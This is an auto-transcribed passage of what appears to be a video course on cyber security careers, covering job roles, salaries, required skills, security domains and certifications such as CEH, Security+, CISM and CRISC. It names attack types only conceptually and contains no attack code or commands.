cyber security is a fascinating branch
of information technology this field is
highly lucrative and if you are
interested in becoming a cyber security
expert then this is the right video for
you
hey everyone welcome to the spool course
video on cyber security expert in this
full course we will learn all about how
to become a cyber security expert and
what the field of cyber security looks
like
but before we begin make sure to
subscribe to our youtube channel and hit
the bell icon to never miss an update
from simply learn
let's begin by looking at the agenda for
today's session
we'll begin this full course by
understanding what a career in cyber
security looks like
we will then move on to understanding
the skills required to become a cyber
security expert
following which we will understand how
you can become a cyber security expert
moving ahead we will go through the
various certifications in the field of
cyber security like comptia security
plus ceh and many more
next on our list is to gain an in-depth
understanding of the field of cyber
security and its fundamentals
we will also be talking about the
different types of cyber attacks like
man in the middle attack phishing brute
force and so on
moving ahead we will understand the
concept of ethical hacking and the
career of an ethical hacker
following this you will be briefed about
the concept of cryptography and how
cryptography is used to protect our data
we will then preview about the
world-renowned cisp certification
we will then conclude this video by
providing the top 50 cyber security
interview questions along with their
answers
we will cover all of these topics in
under 12 hours
so let's start off with an interesting
video on cyber security career
with the world churning virtual cyber
attacks are constantly flooding new
headlines kovit 19 accelerated the
current digital transformation and the
year 2020 witnessed several data
breaches
since technology has become more
intertwined with our daily lives it is
no surprise that the need for skilled
cyber security professionals is
increasing
on that note hey everyone welcome yet to
another exciting video by simply learn
which will take you through the top
cyber security career options available
today there is a significant lack of
skilled cybersecurity professionals who
can tackle the cybersecurity challenges
faced daily hence a career in
cybersecurity is demanding and equally
rewarding
finding the right career path in the
cyber security industry isn't always
easy here we are here to help you with
that
there are a few prerequisites for a
career in cyber security the basic one
being a bachelor's degree in a subject
relating to cyber security however if
you don't have a relevant degree you can
always take up relevant cybersecurity
certifications and kick-start your
cybersecurity journey
a few other skills like networking
knowledge of operating systems and cloud
security are required to start and grow
your cyber security career you can check
out our video on the top five cyber
security skills to know more
cyber security jobs vary from entry
level to executive management and
everything in between there are several
cyber security paths available today it
is best if you start with entry level
and then move on to the next level with
the help of certifications and relevant
experience
here let us have a look at the top five
cybersecurity job roles today
the first job role is that of a network
engineer
network engineers construct and
administer a company's computer networks
they are responsible for installing
configuring and supporting network
equipment they also configure and
maintain firewalls switches and routers
this entry-level cyber security job can
help you start your journey to become an
ethical hacker
the annual average salary of a network
engineer in the us is eighty-five
thousand and ninety-eight dollars and in
india it is around 510 000 rupees
second on our list is information
security analyst as an information
security analyst your primary duty is to
protect sensitive information
information security analysts create and
implement plans for preventing cyber
attacks they monitor data access and
ensure compliance with policies
depending on the cyber threat they
decide if it has to be resolved or
escalated further in the u.s an
information security analyst earns 89
and 140 dollars annually and in india
they earn 6 lakh 42 and 756 rupees
third on our list is ethical hacker they
are also known as penetration testers
they are network security consultants
who identify and exploit system
vulnerabilities just like how a hacker
would do
they probe and test the network using
various penetration tools and software
they also design new penetration tools
and document the test results in the us
a certified ethical hacker earns around
93 000 on an annual average basis and in
india they make around five lakh rupees
the fourth job role that we are going to
talk about is security architect
security architects research and plan
the security elements for their
organizations they design robust
security structures that are capable of
preventing malware attacks
a security architect approves the
installation of routers vpn and
firewalls their duties go beyond just
architecture building and including
formulating company procedures
guidelines and user guides
security architects in the us make a
handsome sum of 124 000 a year on an
average and in india they make nearly 21
lakh 80 000 rupees
and finally fifth on our list is chief
information security officer ciso
they are senior level officers in an
organization
they ensure the safety of the
information they develop implement and
maintain information security and risk
management programs they also interact
with stakeholders and regularly briefed
them with information security concerns
the average annual salary of a chief
information security officer in the
states is a whopping
165 thousand dollars annually and in
india it is 22 lakh 22 and 845 rupees
several companies are looking for
skilled cyber security professionals
phillips siemens google microsoft and ge
to name a few with passion the right
amount of experience and relevant
certifications you can grow your cyber
security career you can check out simply
learn cyber security expert master's
program to equip you with the necessary
skills needed to become an expert in
this rapidly growing domain this course
will help you learn various methods as
to how you can protect your
infrastructure secure your data run risk
analysis achieve compliance and much
more in today's world data is generated
in exchange at a high speed did you know
that 2.5 quintillion bytes of data are
generated every day companies all over
the world make crucial decisions by
analyzing all of this data with the rise
of data there has been a tremendous
increase in the number of cyber crimes
across the globe to prevent cyber
attacks cyber security is implemented so
what is cyber security it is nothing but
the practice of protecting networks
programs computer systems and their
components from unauthorized digital
access as mentioned earlier companies
rely on data and it is required that the
data is not compromised or stolen to do
this job we have various cyber security
professionals who are skilled to protect
data from cyber attacks there has been a
sky-high growth in the number of cyber
security jobs this growth will only
double in the near future as companies
will always be on the lookout for
skilled professionals who can protect
the confidentiality of the data so now
that we know why cyber security jobs are
important let us have a look at the
various cyber security job rules there
are various kinds of cyber security job
roles let's go through few of the top
paying job roles going in the descending
order of the salary structures in the
usa we first have the chief information
security officer job role followed by
the security architect penetration
tester
then we have cyber security engineer
malware analyst and finally we will look
into the computer forensic analyst job
role i will now preview about each of
these job roles individually and look
into their responsibilities skills and
salary structures both in the usa and in
india so let's start off with chief
information security officer a ciso is a
senior level officer in any organization
he is entrusted with the safety of the
data in an organization a ciso has
various responsibilities they are
required to develop implement and
maintain an organization security and
risk management program they also
communicate with their organization
stakeholders and brief them about
various information related security
concerns by doing so they are able to
implement a better security system for
an organization at times a ciso would
have to also recruit an id team's
members they need to make sure that the
candidate is knowledgeable and skilled a
company's risk and vulnerabilities have
to be predicted beforehand prediction of
such risks and vulnerabilities are taken
care of by a ciso they play a major role
in preventing cyber attacks in any
organization let's now look at the
different skills required to be a chief
information security officer first and
foremost a candidate must have good
communication and presentation skills
this is very important for any
organization a degree in computer
science along with an mba is a preferred
qualification mba is not mandatory but
there is an added advantage if the
candidate has an mba along with a
computer science degree the candidate
must be good at handling security
breaches it is preferred that the
candidate has prior experience of
handling a security breach and who is
also good with incident management many
employers prefer candidates who have
global certifications to become a chief
information security officer the
preferred certifications are cism that
is certified information security
manager and certified information system
security professional cisp if a
candidate has either of these
certifications they have a better chance
of getting a job as a chief information
security officer let's now move on to
their salary structures a ciso earns
nearly 180 000 dollars in the usa in
india the salary is nearly 25 lakhs per
annum that's a lot of money so these
were the responsibilities skills and the
salary structure of a chief information
security officer let's move on to our
next role our next role is that of a
security architect a security architect
maintains the security of an
organization's computer systems they
prevent the computer systems from
malware attacks let's look into their
responsibilities first and foremost our
security architect identifies weak spots
in a system by performing vulnerability
tests
these tests are carried out on a regular
basis along with vulnerability tests
risk analysis and security assessments
are also done by a security architect
installation of routers vpn and
firewalls are approved by a security
architect these devices are very
important when it comes to the security
of an information system well a security
architect rightly approves the
installation of these devices digital
signatures and public key
infrastructures are designed in addition
to all the eba responsibilities a
security architect also provides
technical assistance and guidance to the
other security team members let's now
move on to the skills required to be a
security architect first and foremost
the candidate must have a computer
science or an information technology
degree coming to the experience the
candidate must have an experience in the
field of risk management as the role of
a security architect is a lot to do with
managing risks understanding of the
network basics and various security
protocols along with cryptography is
required to be a good security architect
lastly the preferred certification to
become a security architect is that of a
cissp which is certified information
system security professional as
mentioned earlier this is only a
preferred certification a candidate who
has this certification has a higher
chance of bagging a security architect
job let's now look into the different
salary structures in the usa and in
india in the usa a security architect
earns nearly 123 thousand dollars per
annum in india a security architect
earns nearly 20 lakhs per annum so
that's all about security architect
let's now move on to our next role that
is penetration tester a penetration
tester also known as an ethical hacker
is a cyber security professional who
tries to exploit a security system's
vulnerabilities just like how a hacker
would do a penetration tester mimics the
role of a hacker let's look into the
various responsibilities of a
penetration tester as the name suggests
a penetration tester needs to perform
penetration tests to discover and
identify vulnerabilities in a system in
addition to this they are also
responsible for designing new
penetration tools all the penetration
tests results are documented and based
on the document new security measures
are discussed with the other it team and
the management a penetration tester
performs tests by developing codes and
they also conduct security audits which
help them understand the vulnerabilities
in a system let's now look into the
different skills required to be a
penetration tester a candidate must have
one to four years of experience in the
information security field knowledge of
windows linux unix operating systems is
required also the candidate must know c
and c plus languages such as java php
and perl are preferred by employers but
not a requirement to successfully back
the position of a penetration tester the
preferred certifications are certified
ethical hacker that is ch and certified
expert penetration tester that is cept
let's look into the salary structures of
a penetration tester in the usa a
penetration tester earns nearly 117 000
per annum and in india a penetration
tester makes nearly 4 lakh rupees per
annum
so those were the responsibilities
skills and salary structures of a
penetration tester
let's now move on to our next job role
that is
cyber security engineer on the whole a
cyber security engineer protects an
organization's network and its data they
also plan security measures to prevent
an organization from cyber attack let's
look into the responsibilities of a
cyber security engineer they design
cyber security platforms for a company
they are also responsible for planning
and implementing cyber security measures
well a cyber security engineer solely
designs plans maintains and implements
security measures in an organization
they are also required to report and
communicate with the other teams in an
organization a cyber security engineer
is different from a network security
engineer while a network security
engineer looks into the troubleshooting
a cyber security engineer looks into the
prevention of cyber attacks let's look
into the skills required to become a
cyber security engineer just like the
other job profiles a degree in computer
science or information technology is a
must well two years of experience in the
relevant field is required to become a
cyber security engineer a cyber security
engineer is needed to design security
systems hence a candidate with a good
problem solving skill is required along
with good problem solving skills the
candidate must also be good with
networking skills as mentioned earlier
knowledge of cnc plus plus is a must
java and python knowledge is preferred
to be a cyber security engineer moving
on to the salary a cyber security
engineer earns nearly 96 000 dollars in
the usc whereas in india a cyber
security engineer earns nearly 7 lakh
rupees per annum moving on to our next
job role that is malware analyst as the
name suggests a malware analyst is one
who identifies various cyber threats
such as worms viruses trojans boats to
understand their nature a malware
analyst is skilled at analyzing the
different malware threats in a system
let's now look into a malware analyst's
responsibilities they are responsible to
identify threats and once they identify
they are supposed to document the
methods to avoid such malware threats
they also research and develop malware
protection tools various malware
protection tools are developed by
malware analysts so that the next time a
cyber threat occurs they're able to
easily identify
in addition to the above
responsibilities a malware analyst is
also responsible to constantly be
updated with the new malware threats
moving to the skills required a
candidate must know windows linux unix
operating systems and knowledge of c and
c plus plus is a must usage of tools
like idea pro early ddg reg short and
tcp view is suggested having a giac
reverse engineering malware
certification is a plus point the
certification is only a preferred
certification it is not a must that the
candidate must process this
certification moving on to the salary
structure a malware analyst earns nearly
eighty thousand dollars in the usa and
earns nearly rupees six lakhs per annum
in india so those were the skills
responsibilities and salary structure of
a malware analyst let's move on to our
last job role that is computer forensic
analyst previously we have seen the job
roles wherein they tried to protect a
company from a cyber attack in this role
we will see how a computer forensic
analyst works after a cyber attack a
computer forensic analyst works on cases
following an attack they collect digital
evidences to retrieve information let's
look into their responsibilities with
the help of various investigation tools
a computer forensic analyst gathers
evidences from a system which was a
victim of a cyber attack their main
responsibility lies in recovering
deleted manipulated or stolen data a
computer forensic analyst helps various
officials in investigating a case by
discovering evidences from data which
was manipulated or compromised there
have been a lot of cases where a
computer forensic analyst has come to
the rescue of the police department
moving on to the skills the candidate
must hold a bachelor's degree and work
experience in the related field is
required for the post of a computer
forensic analyst it is not necessary
that the candidate must hold a computer
science degree but the candidate must
have relevant work experience a
candidate must have knowledge of
networking law and criminal
investigation as they have to do a lot
with investigating cases as well a sound
analytical mind is critical as they have
to analyze data and arrive at
conclusions as to identify the cyber
criminals the preferred certifications
to become a computer forensic analyst
are certified forensic computer examiner
that is cfce and certified computer
examiner that is cce well these were the
skill sets required to become a computer
forensic analyst moving on to the salary
structures a computer forensic analyst
earns nearly 71 000 dollars in the usc
and in india a computer forensic analyst
earns nearly eight lakh rupees per annum
that was all about computer forensic
analyst well those were the six top
eight jobs in the field of cyber
security now i will run you through a
sample resume of a cyber security
engineer this is only a sample resume of
a cyber security engineer you can alter
it according to your own preference here
we first start off with the name and
your email id and phone number then a
quick summary about yourself and what
you're good at and what you are looking
for in an organization after which you
can give your linkedin profile link and
your github profile link if you have one
moving on to the experience here you
would have to give the company's name
and the tenure ideally for a cyber
security engineer the minimum number of
years required is two and below that you
can write the different responsibilities
that were taken care by you in your
previous organization tcp network
administration and security monitoring
are two important responsibilities that
any cyber security engineer must have on
their resume it is great if you have
configured firewalls and ids as well
underneath that you can mention the
education and it is required that you
have a degree in computer science or in
information technology you can then
mention your university and your gpa
moving on to the skills we have
technical skills and non-technical
skills here under technical skills you
would have to write the languages that
are known to you for example c c plus
plus which is a must java and python are
preferred too knowledge of windows linux
and unix operating systems will also
have to be on your resume if you're
applying for a post of a cyber security
engineer the other skills depend from
person to person here i have ids and ips
penetration vulnerability testing
encryption technologies knowledge of sql
and at the end you can also write the
certifications ideally a cyber security
engineer must have ccna ccnp
certifications in addition to it even a
comptia plus certification is preferred
moving on to the non-technical skills
here you can mention the languages that
you're good at the different
competitions that you have participated
in it can also have your co-curricular
activities and anything to do with
problem solving would also be an added
advantage with businesses moving online
and shifting to cloud storage currently
the demand for cyber security is at its
peak
with that comes a high demand for cyber
security experts who can safeguard
digital data
according to cyber crime magazine by
cyber security ventures globally there
would be nearly 3.5 million on fill
cyber security jobs by 2021 and the
number of internet users will hit a
whopping 6 billion by 2022
these numbers speak volumes and this
shows the growing demand for cyber
security professionals across the globe
now that you know the high demand for
cyber security professionals let us help
you start your cyber security career by
bagging the right skill set
many of you out there might be waiting
to become a cyber security professional
but are unsure of how to go about it and
what skills you would need to get a
cyber security job
not to worry we are here to help you
with that after extensive research we
have come up with the top five skills
that will help you get into the field of
cyber security let's have a look at
these skills individually
first we have networking and system
administration
the number one skill you need to have to
enter the field of cyber security is
computer networking
networking is the backbone of the
internet it is imperative that you have
an in-depth understanding of networking
to start a career in cyber security a
network is a group of interconnected
devices and networking is the art of
understanding how data is sent
transmitted and received amongst these
devices
you need to know various routing
protocols the tcp and osi models govern
networking the osi model is
comparatively newer
basically in these models all the
protocols are grouped into layers and
work together to help you receive data
on your device sent from a server
learning networking will help you
understand the technical aspects of data
transmission which will help you secure
your data
you can take up networking
certifications like security plus and
cisco ccna to gain a strong networking
foundation
another skill that will be beneficial
for you is to master system
administration
if you think about it all of us are
sysadmins at some level
system administration is all about
configuring and maintaining computers
you must be curious to know every aspect
of your computer features and settings
and play around a bit
carry out a trial and error method and
give yourself small tasks like
recovering deleted files or monitoring
old viruses on a vm
explore new techniques put them into use
and expand your knowledge
let us now move on to our second skill
knowledge of operating systems and
virtual machines
to become a cyber security professional
you need to have a strong knowledge of
operating environments such as windows
linux and mac os
cyber security professionals largely use
linux and it comes with several tools
to learn operating systems go ahead and
set up and use virtual machines that is
vms and play around with them
this will help you gain hands-on
experience
as a cyber security expert you should be
comfortable working on any os
vms allow you to train and research in
an isolated environment and help you
maximize your skills
the next point to remember is to know
kali linux
it is the most widely known linux
distribution for ethical hacking and
penetration testing
it comes with several hundred tools
related to penetration testing malware
analysis security research computer
forensics and so on
kali contains several projects and you
can learn a lot another good thing about
kali is that it is free to use so what
are you waiting for download and start
right away
remember that linux is the backbone of
cyber security and a commonly asked
topic for cyber security interviews
especially for pen testing roles
moving on to our third skill
our third skill is network security
control
it is another basic skill that every
cyber security professional should have
network security control refers to the
different measures which are employed to
enhance the security of a network
it is simple you can only safeguard your
network if you know how it works how
routers firewalls and other devices work
a firewall is a hardware or software
that blocks incoming or outgoing traffic
from the internet to your computer
firewalls are required to secure a
network as a cyber security expert you
must be able to leverage a firewall to
filter and prevent unauthorized traffic
onto the network
in addition to that as a cyber security
expert you must know about intrusion
detection systems intrusion prevention
systems virtual private networks and
remote access
an intrusion detection system ids is
designed to detect unauthorized access
to a system
it is used together with a firewall and
a router
you should be able to operate the ids
and recognize any security policy
violations and malicious traffic on the
network
as many of you may have used a vpn is a
connection between a vpn server and a
vpn client it is a secure tunnel across
the internet
moving on next up we have an interesting
skill any idea what that is if yes pause
and leave a comment as to what you think
the next skill will be
if getting your learning started is half
the battle what if you could do that for
free visit skill up by simply learn
click on the link in the description to
know more
and before we jump into this skill if
you find this video interesting make
sure to give it a thumbs up
fourth skill on our list is coding
so you might be wondering if coding is
really required to become a cyber
security professional well it is true
that not all cyber security
professionals have or need coding skills
however having zero coding knowledge may
limit your opportunities in the future
knowing a couple of programming
languages will help you identify the
plan behind an attack and defend against
deadly hacking techniques
so as seen on your screens these are the
best programming languages to learn to
make your cybersecurity career
worthwhile
we have c and c plus the c programming
language is the backbone of most
operating systems c and c plus are low
level programming languages that you
need to know as a cyber security
professional
on the other hand python is a high level
programming language that is becoming
popular among cyber security experts
today knowing python will give you an
upper hand in your career it will help
you identify and fix vulnerabilities
javascript is another high level
programming language that adds
interactivity to web pages
a good advantage of knowing javascript
is that you can prevent cross-site
scripting attacks from occurring
as in these attacks the attacker
implants malicious code in a web
application speaking of php because most
of the websites are created using php
learning it will help you defend against
intruders
similarly html is another language cyber
security professionals should understand
as most websites use it and it is one of
the easiest languages to learn
another programming language that you
can use is golang it is great for
cryptography you can solve various
cybersecurity problems with it
then we have sql that is structured
query language
attackers use this language to damage
the stored data one such example is the
sql injection attack hence having a good
understanding of sql will be highly
beneficial
another point we'd like to highlight is
to have knowledge of assembly language
this will help you become a cyber
security engineer assembly will help you
understand how malware functions and
thereby help you defend against it
in the cyber security domain you can't
just lock into a single language and
hence it is advised that you're
acquainted with a couple of them
you can also do a crash course for these
languages and learn them
hence determine the best programming
language for your cyber security role
and get familiar with the basics
moving on our fifth skill on the list is
cloud security
there is a growing demand for cyber
security professionals with cloud
security skills in the coming years
companies are on the lookout for
professionals with security skills
applicable to public and hybrid cloud
platforms such as amazon web services
and azure more organizations look to
cloud infrastructure to store data and
run applications
this includes the implementation of
policies and technologies that protect
cloud-based systems and
devices just like application
development security cloud security also
involves building secure systems from
the start
companies want professionals who can
manage the cloud security tools to
identify and prevent any cloud breaches
people with experience and knowledge in
managing big platforms such as microsoft
azure aws and the gcp are in high demand
now that we have seen the top five cyber
security skills let us go through a set
of additional skills that can help you
get into the cyber security field
remember that to become a successful
cyber security expert you must possess a
rich and diverse skill set
so in a list of additional skills first
we have risk analysis
identifying risks even before their
arrival is a great skill cyber security
professionals are required to identify
manage and mitigate risks
risk management and mitigation is a
skill set that is going to be highly in
demand in the coming years
next we have information security
companies require skilled professionals
who can protect their electronic data
from unauthorized access here in demand
skills are authentication authorization
malware analysis and data recovery
next on our list is security incident
handling and response
as a cyber security expert you must be
prepared to handle any forthcoming
threat of violating an organization
security policy
by following an updated incident
response plan your team can proactively
protect your data and minimize the
damages
in security incident management you are
required to identify manage record and
analyze security threats in real time
a security incident can be an active
threat or a successful compromise of
data or an attempted intrusion
it can also be incidents like ddos
attacks phishing apts ransomware and
many more
another important pointer is that as a
security practitioner you must also
manage and analyze the security
information and event management siem
tools and services
moving on we have security audit
security auditing is an internal check
that is carried out to find flaws in the
organization's information system you
must be able to conduct a review of the
organization's adherence to regulatory
guidelines
security audit and compliance knowledge
are very crucial as any mistake of
regulatory compliance could lead to
hefty penalties
soon organizations will need people who
are more familiar with the various data
privacy regulations if you are good at
paperwork you can capitalize on this
skill companies will need people who can
understand what paperwork to file and
which security protocols to use to
comply with the regulations
finally we have loss and regulations and
often overlooked cybersecurity aspect
there are several cybersecurity laws and
regulations and if you break these laws
intentionally or not it doesn't matter
as you will still be charged
these laws define how you can use the
internet and it also defines how people
can be protected from becoming the
victims of cyber crimes
knowing these laws and regulations and
following the best practice will make
you ethical at your job and this will in
turn be good for your organization so
those were our list of additional skills
apart from these make sure you stay
updated with new hacks and learn new
tools as cyber security is ever evolving
another important skill apart from these
technical skills is your soft skills
having a set of good soft skills will
help you bag your dream job we have a
video on the top 5 soft skills that will
help you grow in your career do watch
that and incorporate those skills as
well let's start off with the
educational qualifications first so as
far as educational qualification is
concerned having a graduate degree in
computer science or i.t security or
related field is a given having a
master's program or a master's degree is
an added advantage there are a lot of
universities out there in today's world
that offer both bachelor's and master's
degrees in cyber security or various
computer fields you might want to look
them up before you decide which
university you want to you want to go
with uh there are private institutes
like ec council sans or comchair that
offer these kind of programs as well the
costs vary some of them are
correspondents some of them are physical
in nature so let's talk about the skills
that you require to become a cyber
security expert or an engineer these are
your baseline skills it will be very
important that you have some of the
knowledge out of all of these uh tasks
it may not be necessary that you have
everything at
the start itself but it will help you if
you start building on these technologies
before you start looking at advanced
certifications so you need to have solid
ground and id fundamentals which means
that you need to understand computers
you need to understand how they function
the components of a computer
uh maybe what's a processor what is a
cachet basically understanding the
hardware part of it right then solid
ground in networking fundamentals uh you
uh hackers normally target the network
you want to hack over the internet you
want to hack over the intranet there are
a lot of protocols that are required and
are utilized for data to be transmitted
from one point to another there are a
lot of routing protocols of how a data
packet can be converted from a internal
ip address to an external ip address how
that packet is going to take a part to
the end point and how is it going to
travel back to your machine and how your
machine and the endpoint machine are
going to interact with each other so
having a good understanding of
networking and how computers function
over the intranet and the internet is a
very much required knowledge base coding
skills now as far as coding is concerned
we are not going to develop applications
over here but some scripting skills
would be necessary especially if you're
going into network security and host
based security uh for example you want
to write your write your own exploit in
various tools like metasploit so you
might want to learn languages like ruby
however if you're going to go into
application security then knowing java
joy knowing c plus plus those kind of
languages is a must you may not be able
to write complex programs but you need
to understand how those functions are
being called you need to know standard
secure coding practices that that need
to be utilized for an application to be
secure then understanding the
architecture of an operating system it
is imperative that we know how operating
systems function and not function from a
usability perspective but from a
troubleshooting perspective we need to
understand uh if there is an error on
the operating system how do we
troubleshoot that we need to understand
how processes work in the background how
memory mapping works in the background
uh what web application pools are being
utilized and the various protocols are
that are being consumed by the operating
system now cloud security is a very
niche skill in today's world but cloud
as we all know is here to stay and most
of the organizations that you will deal
with will either have a private cloud a
public cloud or a hybrid cloud so it is
imperative that you upskill yourself
understanding how cloud technologies
work how they can be integrated in your
day-to-day infrastructure and how you
can secure a cloud now this doesn't
become a baseline requirement obviously
you'll need to grow and you'll need to
build based on the expertise that you
have but over a period of time it would
benefit you to have cloud security
knowledge and then malware analysis and
reversing when you're talking about
cyber security one of the most common
attacks that we'll see would be from a
virus or a trojan so understanding how
these softwares work how to identify
them how to troubleshoot them how to
reverse engineer them and analyze these
malwares becomes important again this
may not be a baseline requirement but
you need to hone on your skills on
understanding malwares and reverse
engineering them especially if you're
going into a malware analysis kind of a
role let's start with the domains in
cyber security let's understand what
kind of domains are available and how we
can map them as we go ahead with
certifications and our job rules so
starting with the domains in cyber
security there is access control systems
and methodologies telecommunications and
network security security management and
practices access controls uh control
systems and methodologies would talk
about identity and access management
single sign-ons federation so basically
designing access controls identifying uh
the people who are trying to log in
authenticating them and then authorizing
them to access some resources that are
there in your organization so we're
basically talking about the iaa
standards over here identification
authorization authentication and
accountability then there's
telecommunications and network security
so you start up here with certifications
like ccna ccnp where you're talking
about communications and protocols that
work on the intranet and the internet so
how to secure these protocols how to
deploy these protocols to start off with
how to configure switches routers and
how to secure them so that data leakages
or attacks on your networks can be
minimized then we have security
management practices which basically
deal with disaster recovery and business
continuity planning so here you're
planning about system failures because
of various attacks like a distributed
denial of service or a virus or
ransomware attack or even environmental
attacks like natural disasters like
fires or flooding and man-made disasters
where people cannot show up to work and
you have to ensure that your business
continuity is not affected because any
of these factors security architectures
and models so this domain focuses mostly
on having security policies and
procedures so here you are more on a
managerial perspective where you're
creating policies to be implemented in
your organizations policies are nothing
but high level standards which you need
to implement for example what level of
encryption you want do you want to use a
policy would include things like data
classification so you're identifying
data and you're classifying them based
on the sensitivity of that data towards
your organization for example some of
that data could be classified some of
them could be secret top secret and some
data could be unclassified so these
policies help you identify and decide
how you're going to treat security in
your organization then we have law
investigation and ethics so this domain
can be mapped with the forensic
investigations so for example a crime
has happened somebody has got
compromised some data has been
compromised you as a foreign
investigator come in and try to analyze
what went wrong you try to analyze what
has been affected to what extent has
been affected how did the attack happen
then application and system development
security now this is where you're
talking about application security so
let's say you go into a software
development lifecycle you're developing
an application and you want to treat
that application with security in mind
so your ova's top 10 open web
application security project comes in
you look at the top 10 risks like
injection attacks uh maybe cross-site
scripting cross-site request forgery and
you try to mitigate these attacks by
following secure coding practices
testing the application from a security
perspective and ensuring that your
coding is strong enough to withstand
such attacks cryptography so this is
where you
go into the encryption phase where you
are going to try to create solutions on
how which kind of encryptions you want
to utilize to protect which kind of data
if you remember earlier on we talked
about policies where we did data
classification where some data is
sensitive some data is classified top
secret and those different various
classifications now uh to keep costs at
bay you cannot use the same encryption
across because what you're using for
confidential information or secret
information would be a very high level
encryption which would cost you a lot of
money to implement so in cryptography
it's basically you becoming an expert in
understanding which kind of encryption
standards you want to implement on what
kind of data or
what kind of solutions you want to
integrate on an organizational level so
here you'll be looking at data in use
when data is being consumed by a user
data in motion when it's been
transmitted for example the https
connection that we have with websites or
data in rest when data is being stored
onto a stationary hard disk and you want
to encrypt that then you have the
computer operation security so this
would be covering your day-to-day
security operations so something that we
call a stock a security operations
center where you're going to look at all
the various incidents that happen on a
regular basis you're going to
investigate those incidents and you're
going to see if they're going to affect
your organization's security in any
which map in any which manner and then
trying to come up with a solution to
prevent that from happening and the
final part is physical security now this
does look like it it may not cover i.t
security but it does for example your
doors that you're going to place to
sensitive areas for example a server
group you do not want anyone and
everyone access to that server room so
what kind of security are you going to
use to secure that server room for
example cctv cameras or biometrics on
your doors so what kind of doors do you
want there in the first place do you
want to keep security guards over there
and they're going to frisk people to see
if they're carrying anything that can be
used to manipulate the security of the
servers moving on from the domains let's
start with the foundational cyber
security courses now the first four that
are populating the screen ceh security
plus certified network defender and the
forensic investigator now they are
mapped as foundational cyber security
courses but in their own right they are
still advanced courses because if you
see they do assume that have some
knowledge on scripting you may have some
basic knowledge on operating systems but
you are technically adept at analyzing
problems so they do assume a little bit
of knowledge from your side if you're a
fresher you want to hone up a little bit
on your networking skills you want to
hone up a little bit on how operating
systems work and how their processes
work and then you want to attempt these
certifications the first one being sir
certified network defender now this is a
certificate that talks about network
security ceh on the other hand talks
about an ethical hacker from a offensive
security perspective where you're doing
a penetration test and you're going to
try to leverage attacks against an
organization to analyze how their
security is kamcha security plus also is
on the same lines of ceh uh ceh is
offered by an organization called ec
council the competitor to them is
comchia both of them are globally
accepted certifications widely accepted
across the americas europe and asia the
chfi which is the computer hacking
forensic investigator certification is
basically the niche certification for
forensic investigators you can directly
attempt the chfi but if you don't know
how hackers work it may defeat some of
the purpose so uh it would help to first
go for the ceh or the security plus and
then this foreign investigator
certification let's look at a brief uh
overview on each of these to start off
with the ceh it is going to train you in
reverse engineering so this is where
penetration testers come in and the word
ethical hackers hackers are basically
people who try to get unauthorized
access to various resources ethical
hacker is where you're going to emulate
or simulate those attacks with an
authorization from the organization so
you still keep it legal the aim is to
find out various flaws in the current
deployment of security controls and then
try to figure out how you can plug those
flaws and increase or improve on the
security portion so it's ceh and comp
comchair security plus are about the
same it's just the difference of the
certification body but both of these are
widely accepted and globally accepted as
well then we have the certified network
defender covers
protection identification and response
to on how we approach network security
so this is the certification that's
going to explain you certain protocols
we're going to talk about switches
routers various technologies of lan van
man and we're going to talk about how we
can secure networks uh on an
organizational perspective the forensic
investigator certification as we've
discussed is in the domain of law
investigation and ethics it talks more
about analyzing how the attack happened
what was affected what was compromised
to what extent and then we are trying to
reverse engineer and try to identify the
culprit of who attacked that
organization after the foundational
we're going to look at the managerial
cyber security courses now here you are
either a cyber security manager or
you're looking at a lead kind of a
scenario where you are responsible to
manage the team who's going to implement
security in your organization the
difference here is the previous courses
are very technical in nature very
hands-on in nature and you are the
person who's going to be responsible to
implement that security control or test
that security control here in managerial
cyber security courses you are not going
to be technical hands-on but you're
going to
be more on the policy side of things so
start off with cobit cobit stock talks
about control objectives for information
and related technologies now this is an
advanced kind of a certification then we
have cism some people call it system as
well it's a certified information
security manager certification then we
have csa or cisa certified information
systems auditor and then we have the
crisc which is a certified in risk and
information systems control so as you
can see just from the names nothing
hands-on no penetration testing no
vulnerability assessments no
implementation of tools but you're going
to have a holistic view of how
vulnerabilities and threats are going to
affect the organization and you will be
responsible to manage and guide the team
on what to be implemented and what to be
consumed so you will be managing teams
technical teams on how to implement
security and how to analyze that
security uh you'll try to make sense of
data that has been provided to you and
utilize that data to make business sense
so what is cobit it gives you a deep
understanding of the framework for
managing and governing enterprise id
environments so it's all about the
environment now you're in an enterprise
organization this is a standard so it
gives you a basic framework of how you
want to implement security from an
end-to-end perspective you're going to
talk about id governance here you're
going to deal with a lot of stakeholders
over here you're going to get a lot of
various inputs and you're going to
analyze that information and you're
going to implement the framework based
on the analysis that you have done
people with cobit certifications and
who've been hired as managers would
normally have around eight nine years of
experience and only then would they be
put in such a position cism the security
manager certification it is a key
certification for information security
professionals who manage design oversee
and assess enterprise information
security so this is more from a project
management perspective but projects
regarding security so it is a semi
technical certification it is necessary
that you understand the technical terms
of hacking or ethical hacking you have a
basic understanding of what kind of
risks or attacks are present in a cyber
security enterprise and then you're
going to manage the project and try to
implement security and analyze that
security to see everything meets
standards so as far as the security
manager is concerned since we're talking
about the manager portfolio you
obviously will have to have some
experience before you
get these kind of job roles then comes
the cisa or the cisa the systems auditor
it will give you the skill sets to
govern and control enterprise i.t and
perform an effective security audit on
any organization so this is more of a
system auditor's profile where you're
going to talk about overall functioning
of a id infrastructure in an
organization you're going to audit that
infrastructure to ensure that it meets
standards and you're going to look at
the risks that that are going to affect
this infrastructure you're going to do a
risk management exercise and then you're
going to come up with security controls
on how to minimize or mitigate these
risks the crisc the risk there's another
risk management certification but it is
widely accepted and it has a lot of
value globally this course will enable
you to design implement monitor and
maintain information security controls
for enterprises now this certification
only deals with risk management so it
has a complete strategy that evolves and
revolves around risk identification
assessment response and control
monitoring so the major job position
that you're going to have is in an iit
infrastructure identifying the risks or
identifying the identifying the security
risks that the organization is going to
face you're going to assess them so a
business impact analysis if that risk
comes true how is it going to affect the
business not only from a technical
perspective but from a monetary
perspective as well and then you're
going to do a cost benefit analysis for
a security control for example i figure
out that a web application has a sequel
injection attack vulnerability if the
assessment proves that if this becomes
real or if this is realized by a hacker
we would be looking at a potential loss
of 1 million dollars and will have to
report it to the regulatory authority
which would then lead to further fines
so here then we're going to figure out a
response to this threat where let's say
we identify a web application firewall
and an implementation of that firewall
will minimize the risk at the same time
a developer would come into the picture
and say we can redevelop the application
or that part of the application where
the vulnerability exists and we can
ensure that the application is secure
now when you do a cost benefit analysis
you figure out that for the recoding of
that part of that application would take
at least six months and is going to look
cost us a lot of money whereas if we
implement a web application firewall it
will just cost us around fifty thousand
dollars and we would still minimize a
